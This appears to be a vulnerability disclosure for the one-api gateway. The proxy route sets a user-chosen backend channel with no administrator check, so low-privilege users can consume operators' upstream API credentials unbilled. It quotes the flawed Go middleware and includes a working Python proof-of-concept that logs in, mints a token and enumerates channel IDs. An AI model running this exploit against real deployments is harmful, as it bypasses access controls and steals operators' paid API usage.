one-api Proxy Route Missing Administrator Permission Check Allows Low-Privilege Users to Access Arbitrary Backend Channels
one-api's `TokenAuth()` middleware provides two code paths for selecting a specific backend channel. The first path (`sk-token-<channelId>` suffix) correctly enforces an administrator permission check. The second path (`/v1/oneapi/proxy/:channelid/*target` URL parameter) writes the user-supplied `channelId` into request context **without any permission verification**. This allows any authenticated low-privilege user to route requests through arbitrary high-privilege channels, bypassing group, model, and quota restrictions. On channels that follow the OpenAI-compatible request format, the attacker receives real model responses while the operator's upstream credentials are consumed — and the local billing/accounting system does not attribute this usage to the attacker.
# middleware/auth.go
```
// middleware/auth.go:135-141 — SECURE path (admin check present)
if len(parts) > 1 {
    if model.IsAdmin(token.UserId) {
        c.Set(ctxkey.SpecificChannelId, parts[1])
    } else {
        abortWithMessage(c, http.StatusForbidden, "普通用户不支持指定渠道")
        return
    }
}

// middleware/auth.go:144-147 — VULNERABLE path (no permission check)
if channelId := c.Param("channelid"); channelId != "" {
    c.Set(ctxkey.SpecificChannelId, channelId)  // ← no authorization check
}
```
Once `SpecificChannelId` is set, `middleware/distributor.go:28-59` resolves the channel object (including its real upstream API key) and at line 73 rewrites the outgoing request's `Authorization` header to the channel's stored credential:
```
c.Request.Header.Set("Authorization", fmt.Sprintf("Bearer %s", channel.Key))
```
The proxy relay path (`relay/controller/proxy.go`) then forwards the request to the channel's configured `BaseURL`. Because `RelayProxyHelper` returns `nil` usage, `postConsumeQuota` (at `relay/controller/helper.go:98`) returns early — the attacker's local quota and request count are never debited.

# POC
```
import sys, requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

url = sys.argv[1].rstrip("/") + "/"
user = sys.argv[2]
pwd = sys.argv[3]
prompt = sys.argv[4] if len(sys.argv) > 4 else "hello"

s = requests.Session()
r = s.post(url + "api/user/login", json={"username": user, "password": pwd}, timeout=10)
assert r.status_code == 200 and r.json().get("success"), f"Login failed: {r.text}"

r = s.post(url + "api/token/", json={"name": "poc", "remain_quota": 50000, "expired_time": -1}, timeout=10)
assert r.json().get("data"), f"Token creation failed: {r.text}"
token = "sk-" + r.json()["data"]["key"]

# Step 1: verify normal path is denied
r = requests.post(
    url + "v1/chat/completions",
    headers={"Authorization": f"Bearer {token}"},
    json={"model": "gpt-4", "messages": [{"role": "user", "content": prompt}]},
    timeout=30,
)
print(f"[Normal path] HTTP {r.status_code}: {r.text[:200]}")

# Step 2: exploit via proxy route — enumerate channelId
for i in range(1, 50):
    r = requests.post(
        url + f"v1/oneapi/proxy/{i}/v1/chat/completions",
        headers={"Authorization": f"Bearer {token}"},
        json={"model": "gpt-4", "messages": [{"role": "user", "content": prompt}]},
        timeout=60,
    )
    if r.status_code == 200:
        print(f"[Proxy bypass] channel #{i} HTTP 200")
        print(f"[Model response] {r.json()['choices'][0]['message']['content']}")
        break
    print(f"[Probe] channel #{i} HTTP {r.status_code}")
else:
    print("[-] No exploitable channel found in range 1-49")
```
Run
<img width="1451" height="720" alt="image" src="https://github.com/user-attachments/assets/67712817-95b3-4474-9771-c0588f91b0e0" />
<img width="1285" height="433" alt="image" src="https://github.com/user-attachments/assets/ce3cf4d0-cc95-4313-83dc-0ad2a4812a5f" />

